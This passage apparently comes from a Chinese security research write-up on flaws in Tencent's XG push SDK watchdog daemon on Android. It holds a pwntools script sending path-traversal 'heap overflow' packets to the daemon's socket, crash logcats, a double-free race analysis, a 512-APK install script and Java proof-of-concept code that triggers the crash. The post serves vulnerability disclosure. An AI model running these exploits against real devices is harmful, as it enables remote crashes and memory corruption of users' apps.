<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_connection</span><span class="params">()</span>:</span></span><br><span class="line">    xg_daemon_server = <span class="string">"192.168.8.158"</span></span><br><span class="line">    xg_listen_port = <span class="number">55362</span></span><br><span class="line">    conn = remote(xg_daemon_server, xg_listen_port)</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_debug</span><span class="params">()</span>:</span></span><br><span class="line">    conn = open_connection()</span><br><span class="line">    packet_debug = <span class="string">"debug:1\n"</span></span><br><span class="line">    conn.send(packet_debug)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"S:"</span>+packet_debug</span><br><span class="line">    conn.close()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_heap_overflow</span><span class="params">(n)</span>:</span></span><br><span class="line">    conn = open_connection()</span><br><span class="line">    packet_bound_overflow = <span class="string">"xgapplist:../../../"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        packet_bound_overflow +=<span class="string">"/"</span></span><br><span class="line">    packet_bound_overflow +=<span class="string">"sdcard/, 2100178385\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"S: "</span>+packet_bound_overflow</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%d bytes"</span> % len(packet_bound_overflow)</span><br><span class="line">    conn.send(packet_bound_overflow)</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_normal_packet</span><span class="params">(packet)</span>:</span></span><br><span class="line">    conn = open_connection()</span><br><span class="line">    conn.send(packet)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"S: "</span>+packet</span><br><span class="line">    <span class="keyword">if</span> (packet == <span class="string">"ver:\n"</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"R: "</span>+ conn.recv()</span><br><span class="line">    conn.close()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">           %s &amp;lt;packet_type&amp;gt;</span></span><br><span class="line"><span class="string">           1: send debug packet</span></span><br><span class="line"><span class="string">           3: send heap overflow packet</span></span><br><span class="line"><span class="string">           4: send normal ver: packet</span></span><br><span class="line"><span class="string">           5: send normal tme:12345 packet</span></span><br><span class="line"><span class="string">           6: send normal xgapplist: packet</span></span><br><span class="line"><span class="string">        """</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span>(sys.argv[<span class="number">1</span>] == <span class="string">"1"</span>):</span><br><span class="line">        send_debug()</span><br><span class="line">    <span class="keyword">elif</span>(sys.argv[<span class="number">1</span>] == <span class="string">"3"</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">518</span>):  //notice！</span><br><span class="line">            send_heap_overflow(i)</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span>(sys.argv[<span class="number">1</span>] == <span class="string">"4"</span>):</span><br><span class="line">        send_normal_packet(<span class="string">"ver:\n"</span>)</span><br><span class="line">    <span class="keyword">elif</span>(sys.argv[<span class="number">1</span>] == <span class="string">"5"</span>):</span><br><span class="line">        send_normal_packet(<span class="string">"tme:12345\n"</span>)</span><br><span class="line">    <span class="keyword">elif</span>(sys.argv[<span class="number">1</span>] == <span class="string">"6"</span>):</span><br><span class="line">        send_normal_packet(<span class="string">"xgapplist:\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"unkown packet type! "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;TpnsWatchdog(  495): server get unstall appinfo:com.tencent.wework,2100178384;..&#x2F;..&#x2F;..&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.</span><br><span class="line">I&#x2F;TpnsWatchdog(  495): found 0, pkgName:com.tencent.wework,accid:2100178384</span><br><span class="line">I&#x2F;TpnsWatchdog(  495): try to add to the unstall list</span><br><span class="line">F&#x2F;libc    (  495): invalid address or address of corrupt block 0x4125f850 passed to dlfree</span><br><span class="line">F&#x2F;libc    (  495): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code&#x3D;1), thread 495 (xg_watchdog)</span><br><span class="line">I&#x2F;DEBUG   (  241): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***</span><br><span class="line">I&#x2F;DEBUG   (  241): Build fingerprint: &#39;google&#x2F;hammerhead&#x2F;hammerhead:4.4.4&#x2F;KTU84P&#x2F;1227136:user&#x2F;release-keys&#39;</span><br><span class="line">I&#x2F;DEBUG   (  241): Revision: &#39;11&#39;</span><br><span class="line">I&#x2F;DEBUG   (  241): pid: 495, tid: 495, name: xg_watchdog  &gt;&gt;&gt; &#x2F;data&#x2F;data&#x2F;com.tencent.wework&#x2F;lib&#x2F;libtpnsWatchdog.so &lt;&lt;&lt;</span><br><span class="line">I&#x2F;DEBUG   (  241): AM write failure (32 &#x2F; Broken pipe)</span><br><span class="line">I&#x2F;DEBUG   (  241): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad</span><br><span class="line">I&#x2F;DEBUG   (  241): Abort message: &#39;invalid address or address of corrupt block 0x4125f850 passed to dlfree&#39;</span><br><span class="line">W&#x2F;NativeCrashListener(  960): Couldn&#39;t find ProcessRecord for pid 495</span><br><span class="line">I&#x2F;DEBUG   (  241):     r0 00000000  r1 40139c5e  r2 deadbaad  r3 4013d7a0</span><br><span class="line">I&#x2F;DEBUG   (  241):     r4 4125f850  r5 40148180  r6 4121c000  r7 4125f858</span><br><span class="line">I&#x2F;DEBUG   (  241):     r8 400cc0d9  r9 00000000  sl 00000000  fp bee458ec</span><br><span class="line">I&#x2F;DEBUG   (  241):     ip 00000001  sp bee41710  lr 4010b6cb  pc 4010b6cc  cpsr 600f0030</span><br><span class="line">I&#x2F;DEBUG   (  241):     d0  2064657373617064  d1  6120726f2073736c</span><br><span class="line">I&#x2F;DEBUG   (  241):     d2  6f20737365726466  d3  707572726f632072</span><br><span class="line">I&#x2F;DEBUG   (  241):     d4  2e2f2e2f2e2f2e2f  d5  2e2f2e2f2e2f2e2f</span><br><span class="line">I&#x2F;DEBUG   (  241):     d6  2e2f2e2f2e2f2e2f  d7  2e2f2e2f2e2f2e2f</span><br><span class="line">I&#x2F;DEBUG   (  241):     d8  0000000000000000  d9  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d10 0000000000000000  d11 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d12 0000000000000000  d13 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d14 0000000000000000  d15 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d16 41c3183f70f5e354  d17 3f50624dd2f1a9fc</span><br><span class="line">I&#x2F;DEBUG   (  241):     d18 41c05bc240800000  d19 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d20 0000000000000000  d21 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d22 0000000000000000  d23 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d24 0000000000000000  d25 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d26 0000000000000000  d27 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d28 0000000000000000  d29 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     d30 0000000000000000  d31 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  241):     scr 00000010</span><br><span class="line">I&#x2F;DEBUG   (  241):</span><br><span class="line">I&#x2F;DEBUG   (  241): backtrace:</span><br><span class="line">I&#x2F;DEBUG   (  241):     #00  pc 000116cc  &#x2F;system&#x2F;lib&#x2F;libc.so (dlfree+1191)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #01  pc 0000dc0b  &#x2F;system&#x2F;lib&#x2F;libc.so (free+10)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #02  pc 000016b5  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  241):     #03  pc 00002787  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  241):     #04  pc 0000124f  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  241):     #05  pc 0000e34b  &#x2F;system&#x2F;lib&#x2F;libc.so (__libc_init+50)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #06  pc 00001390  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I</span><br></pre></td></tr></table></figure>


<p>为什么513、514不能触发呢？这个问题一直没有分析得很清楚，因此也没有选择提交，直至厂商对前面两个漏洞进行修复，再次复现这个漏洞的难度加大。</p>
<p>再次观察漏洞的触发位置，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( v18 )</span><br><span class="line">          &#123;</span><br><span class="line">j_j__ZdaPv:</span><br><span class="line">            operator delete[](v18);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现v18 被delete后并没有置为null，那么有没有可能v18会被delete多次呢？作为socket服务daemon，程序使用了epoll系统调用，*<em>因此可以猜想这是并发处理的原因。 *</em></p>
<p>在没有并发的情况下依次传入要添加的xgappinfo，在超过512个xgappinfo时，循环直接跳出，不会尝试添加这个xgappinfo，不会触及到下面delete所在的分支，这也是很长时间我通过调试很难复现该漏洞的原因。但如果存在并发，特别是在即将超过512个xgappinfo时，又传入了多个要添加的xgappinfo，那么由于并发处理，程序会同时尝试添加多个xgappinfo且不会认为超过了512个xgappinfo，此时v18均指向同一地址（即第512个对象中在堆上分配的packagename的地址），那么在v18被delete一次的情况下，紧接着会再次delete一下，从而导致delete出错。</p>
<h2 id="0x06-后续"><a href="#0x06-后续" class="headerlink" title="0x06 后续"></a>0x06 后续</h2><p>腾讯很快对命令注入和空指针解引用引发的远程拒绝服务漏洞进行了修复，主要修复点包括：</p>
<ul>
<li>Socket端口监听任意地址改为监听本地地址。</li>
<li>对Socket端口传入的命令进行了加密。</li>
<li>对传入xgapplist中的packagename进行了过滤，特别是过滤了“/”字符，防止目录穿越。<br>这些防御措施导致我很难再复现最后一个堆内存破坏漏洞了，但通过深入分析，我们仍然可以通过</li>
</ul>
<ol>
<li>编写手机上运行的本地代码</li>
<li>添加手机上已存在的packagename，要超过512个</li>
<li>破解加密算法</li>
</ol>
<p>来予以一一破解。首先，在手机上安装512个packganame(Oh my god! )，这个可以通过脚本解决。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate 512 apks, Build and Install</span></span><br><span class="line">CURDIR=$(<span class="built_in">pwd</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 512)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$CURDIR</span></span><br><span class="line">    DIR=<span class="string">"HelloWorld"</span><span class="variable">$i</span></span><br><span class="line">    PACKAGE=<span class="string">"com.ms509.helloworld"</span><span class="variable">$i</span></span><br><span class="line">    UNSIGNED_APK=<span class="variable">$DIR</span><span class="string">"-release-unsigned.apk"</span></span><br><span class="line">    SIGNED_APK=<span class="variable">$i</span><span class="string">".apk"</span></span><br><span class="line">    android create project -n <span class="variable">$DIR</span> -t 13 -p <span class="variable">$DIR</span> -k <span class="variable">$PACKAGE</span> -a helloworld</span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$CURDIR</span><span class="string">"/"</span><span class="variable">$DIR</span></span><br><span class="line">    ant release</span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$CURDIR</span><span class="string">"/"</span><span class="variable">$DIR</span><span class="string">"/bin"</span></span><br><span class="line"><span class="comment"># sign apk</span></span><br><span class="line">    signapk.sh <span class="variable">$UNSIGNED_APK</span> <span class="variable">$SIGNED_APK</span></span><br><span class="line">    adb install <span class="variable">$SIGNED_APK</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>


<p>其次，破解加密算法可以直接调用程序使用的加解密库，而不必真的破解。最后的POC关键代码如下，注意，我们在快超过512时sleep了一下，使XG SDK的处理能力跟上，然后后面再传入多个xgappinfo，这样有更大的几率触发并发。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">directSendContent(&quot;debug:1&quot;);</span><br><span class="line">directSendContent(&quot;ver:&quot;);</span><br><span class="line">Log.d(&quot;testXG&quot;, &quot;[+] Adding &quot;+Integer.toString(m_appNameList.size()) + &quot;fake xg apps&quot;);</span><br><span class="line">int i &#x3D; 0;</span><br><span class="line">for (String xgapp:m_appNameList) &#123;</span><br><span class="line">    if ((i++) &gt; 530)</span><br><span class="line">        break;</span><br><span class="line">    String cmd &#x3D; &quot;xgapplist:&quot; + xgapp + &quot;,&quot; +</span><br><span class="line">            Integer.toString((int)(Math.random()*1000000)) + &quot;;&quot;;</span><br><span class="line">    Log.d(&quot;testXG&quot;, &quot;[+] &quot; + Integer.toString(i) + &quot; Sending command: &quot; + cmd);</span><br><span class="line">    if (i &#x3D;&#x3D; 510) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            sleep(1000);</span><br><span class="line">        &#125; catch (InterruptedException e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    directSendContent(cmd);</span><br></pre></td></tr></table></figure>

<p>Logcat:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;xguardian(19448): scanAppStatus node:508, pkg:heenstudy.com.sniffclipboard, accid:917429, status:1</span><br><span class="line">I&#x2F;xguardian(19448): scanAppStatus node:509, pkg:com.estrongs.android.taskmanager, accid:230582, status:1</span><br><span class="line">I&#x2F;xguardian(19448): scanAppStatus node:510, pkg:com.ilegendsoft.mercury, accid:995063, status:1</span><br><span class="line">I&#x2F;xguardian(19448): scanAppStatus node:511, pkg:fq.router2, accid:619048, status:1</span><br><span class="line">I&#x2F;xguardian(19448): xg app list size total:512, xgAppsCacheCount:512, xgAppsCacheActivityStatusCount:512</span><br><span class="line">I&#x2F;xguardian(19448): countTimeout&#x3D;0, wait_time&#x3D;310000, nfds&#x3D;1, xgAppsCacheCount&#x3D;512</span><br><span class="line">I&#x2F;xguardian(19448): server accept client 2, 127.0.0.1</span><br><span class="line">I&#x2F;xguardian(19448): countTimeout&#x3D;0, wait_time&#x3D;310000, nfds&#x3D;1, xgAppsCacheCount&#x3D;512</span><br><span class="line">I&#x2F;xguardian(19448): server decrpty receive from client: 42 : xgapplist:easyre.sjl.gossip.easyre,512970;</span><br><span class="line">I&#x2F;xguardian(19448): server get unstall appinfo:easyre.sjl.gossip.easyre,512970;</span><br><span class="line">E&#x2F;xguardian(19448): error accessid:512970</span><br><span class="line">I&#x2F;xguardian(19448): found 0, pkgName:easyre.sjl.gossip.easyre,accid:512970</span><br><span class="line">I&#x2F;xguardian(19448): try to add to the unstall list</span><br><span class="line">E&#x2F;testXG  (10149): [+] response: -1</span><br><span class="line">F&#x2F;libc    (19448): invalid address or address of corrupt block 0x401120c8 passed to dlfree</span><br><span class="line">F&#x2F;libc    (19448): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code&#x3D;1), thread 19448 (xg_watchdog)</span><br><span class="line">I&#x2F;DEBUG   (  242): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***</span><br><span class="line">I&#x2F;DEBUG   (  242): Build fingerprint: &#39;google&#x2F;hammerhead&#x2F;hammerhead:4.4.4&#x2F;KTU84P&#x2F;1227136:user&#x2F;release-keys&#39;</span><br><span class="line">I&#x2F;DEBUG   (  242): Revision: &#39;11&#39;</span><br><span class="line">I&#x2F;DEBUG   (  242): pid: 19448, tid: 19448, name: xg_watchdog  &gt;&gt;&gt; &#x2F;data&#x2F;data&#x2F;com.qufenqi.android.quwallet&#x2F;lib&#x2F;libxguardian.so &lt;&lt;&lt;</span><br><span class="line">I&#x2F;DEBUG   (  242): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad</span><br><span class="line">I&#x2F;DEBUG   (  242): AM write failure (32 &#x2F; Broken pipe)</span><br><span class="line">I&#x2F;DEBUG   (  242): Abort message: &#39;invalid address or address of corrupt block 0x401120c8 passed to dlfree&#39;</span><br><span class="line">I&#x2F;DEBUG   (  242):     r0 00000000  r1 400b5c5e  r2 deadbaad  r3 400b97a0</span><br><span class="line">I&#x2F;DEBUG   (  242):     r4 401120c8  r5 400c4180  r6 4010e000  r7 401120d0</span><br><span class="line">I&#x2F;DEBUG   (  242):     r8 40047221  r9 00000000  sl 00000000  fp bec758dc</span><br><span class="line">I&#x2F;DEBUG   (  242):     ip 00000001  sp bec6f6f8  lr 400876cb  pc 400876cc  cpsr 600f0030</span><br><span class="line">I&#x2F;DEBUG   (  242):     d0  2064657373617064  d1  6f2073736572646c</span><br><span class="line">I&#x2F;DEBUG   (  242):     d2  707572726f632066  d3  206b636f6c622072</span><br><span class="line">I&#x2F;DEBUG   (  242):     d4  0000000000000000  d5  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d6  0000000000000000  d7  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  242):     d8  0000000000000000  d9  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   